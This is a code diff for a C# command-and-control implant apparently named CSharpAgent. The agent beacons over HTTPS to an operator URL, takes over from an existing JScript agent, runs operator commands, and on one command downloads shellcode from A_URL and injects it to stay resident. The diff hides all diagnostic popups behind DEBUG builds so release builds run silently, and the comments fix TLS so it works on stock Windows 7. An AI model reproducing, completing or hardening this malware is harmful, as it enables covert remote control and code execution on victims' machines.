@@ -24,7 +24,9 @@ namespace CSharpAgent
     {
         internal static void Run(string beaconUrl)
         {
+#if DEBUG
             Diag.Show("[3] Run", "Beacon.Run entered — adding Tls12 onto the OS-default TLS mask (|=, never replace)");
+#endif
             // ADD Tls12 to the OS-default protocol mask — never REPLACE it. The Tls12-only
             // assignment bricked stock Win7: its schannel predates TLS 1.2 (unless KB 3140245
             // is installed), so the HTTPS beacon died before the first POST and the 0x0B
@@ -38,6 +40,7 @@ namespace CSharpAgent
                 ServicePointManager.SecurityProtocol |= (SecurityProtocolType)3072;
             }
             catch { }
+#if DEBUG
             // [4] — the mask AS THE RUNTIME SEES IT: 48=Ssl3, 192=Tls1.0, 768=Tls11,
             // 3072=Tls12. Stock Win7 + CLR2 reads 3312 (240|3072) after the |=; a value of
             // exactly 3072 here means the |= landed on a SystemDefault-0 stack and REPLACED
@@ -48,6 +51,7 @@ namespace CSharpAgent
                     ((int)ServicePointManager.SecurityProtocol));
             }
             catch { }
+#endif
             try { ServicePointManager.Expect100Continue = false; }
             catch { }
 
@@ -58,13 +62,15 @@ namespace CSharpAgent
             for (var i = 0; i < headers.Length; i++)
                 if (headers[i][0] == "X-Device-Id") uuid = headers[i][1];
             Log("beaconing to " + beaconUrl + " as " + (uuid != "" ? uuid : "an unidentified machine"));
-            // [5] — if [3] showed and this never does, Identity.Build threw (WMI/registry
+#if DEBUG
+            // [5] — if [3] logged and this never does, Identity.Build threw (WMI/registry
             // access on the box) and the TypeInitializationException killed the process.
-            // The sanitized:… note names the header whose raw value carried control/OEM
+            // The OMITTED:… note names the header whose raw value carried wire-unsafe
             // bytes — the ArgumentException that used to kill POST #1 before any I/O.
             Diag.Show("[5] identity", "headers built — beaconing as " +
                 (uuid != "" ? uuid : "AN UNIDENTIFIED MACHINE (empty X-Device-Id)") +
-                (Identity.LastCleaningNote != "" ? "\n" + Identity.LastCleaningNote : ""));
+                (Identity.LastCleaningNote != "" ? " | " + Identity.LastCleaningNote : ""));
+#endif
 
             // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B Upgrade command
             // that the relay already delivered to the JScript agent on this machine; the
@@ -79,46 +85,61 @@ namespace CSharpAgent
             while (true)
             {
                 post++;
-                // [6] only on the FIRST POST — healthy idle iterations stay silent (a popup
-                // per 20-30 s long-poll would wedge the box and the operator both).
+#if DEBUG
+                // [6] only on the FIRST POST — healthy idle iterations stay silent (a line
+                // per 20-30 s long-poll would grow the file forever).
                 if (post == 1)
                     Diag.Show("[6] POST #1", "sending " + BuildFrames(pending).Length +
                         " bytes — the owed first beacon rides this one");
+#endif
                 byte[] responseBody;
+#if DEBUG
                 try { responseBody = Post(beaconUrl, headers, BuildFrames(pending)); }
                 catch (Exception ex)
                 {
                     Diag.Show("[exit] POST #" + post + " threw",
                         Diag.Describe(ex) +
-                        "\n\nno inner chain, died before any bytes hit the wire = request SETUP (a header value — see [5]); " +
+                        " | no inner chain, died before any bytes hit the wire = request SETUP (a header value — see [5]); " +
                         "SecureChannelFailure = the TLS mask/schannel brick");
                     Log("beacon failed — stopping");
                     return;
                 }
+#else
+                try { responseBody = Post(beaconUrl, headers, BuildFrames(pending)); }
+                catch (Exception) { responseBody = null; }
+#endif
                 if (responseBody == null)
                 {
+#if DEBUG
                     Diag.Show("[exit] POST #" + post + " not 200",
                         "answer was not a clean 200 — fatal per the beacon contract (no retry loop)");
+#endif
                     Log("beacon failed — stopping");
                     return;
                 }
+#if DEBUG
                 if (post == 1)
                     Diag.Show("[7] POST #1 ok", "got " + responseBody.Length + " bytes back — transport established" +
                         (responseBody.Length == 0 ? "; empty body = nothing queued, entering the silent beacon loop" : ""));
+#endif
 
                 pending.Clear();
                 var frames = ParseFrames(responseBody);
                 if (frames == null)
                 {
+#if DEBUG
                     Diag.Show("[exit] malformed", "response body is not a valid [u32le len][bytes] frame stream — fatal");
+#endif
                     return; // malformed body — fatal, same as a bad status
                 }
                 if (frames.Count == 0) continue;
                 foreach (var command in frames)
                 {
+#if DEBUG
                     Diag.Show("[cmd] 0x" + (command.Length > 0 ? command[0].ToString("X2") : "00"),
                         "command frame — " + command.Length + " bytes, corrId " +
                         (command.Length >= 5 ? BitConverter.ToUInt32(command, 1).ToString() : "0"));
+#endif
                     var reply = Dispatch(command);
                     if (reply != null) pending.Add(reply); // Exit never returns from Dispatch
                 }
@@ -178,7 +199,9 @@ namespace CSharpAgent
             if (command.Length == 0) return Reply(2, 0);
             if (command[0] == 10)
             {
+#if DEBUG
                 Diag.Show("[exit] cmd 0x0A", "operator Exit — Environment.Exit(0) kills this process now");
+#endif
                 Environment.Exit(0);
                 return null; // unreachable — Exit never returns
             }
@@ -205,25 +228,40 @@ namespace CSharpAgent
                         if (nl < 0) break;
                         start = nl + 1;
                     }
+#if DEBUG
                     var aUrl = Environment.GetEnvironmentVariable("A_URL");
                     Diag.Show("[0x0C] env", "env lines applied — A_URL = " +
                         (string.IsNullOrEmpty(aUrl) ? "<not set>" : aUrl));
+#endif
                     var payload = C2Payload.Data;
                     if (payload.Length == 0)
                     {
+#if DEBUG
                         Diag.Show("[exit] 0x0C", "no A_URL / empty payload — replying status 1 (nothing to inject)");
+#endif
                         return Reply(1, corrId); // no A_URL ⇒ nothing to inject
                     }
+#if DEBUG
                     Diag.Show("[0x0C] inject", "payload " + payload.Length + " bytes downloaded — calling ShellcodeRunner.RunPayload");
+#endif
                     ShellcodeRunner.RunPayload(payload);
+#if DEBUG
                     Diag.Show("[0x0C] done", "PIC agent injected into this process — staying resident, replying status 0");
+#endif
                     return Reply(0, corrId);
                 }
+#if DEBUG
                 catch (Exception ex)
                 {
                     Diag.Show("[exit] 0x0C failed", Diag.Describe(ex));
                     return Reply(1, corrId);
                 }
+#else
+                catch (Exception)
+                {
+                    return Reply(1, corrId);
+                }
+#endif
             }
             return Reply(2, corrId);
         }
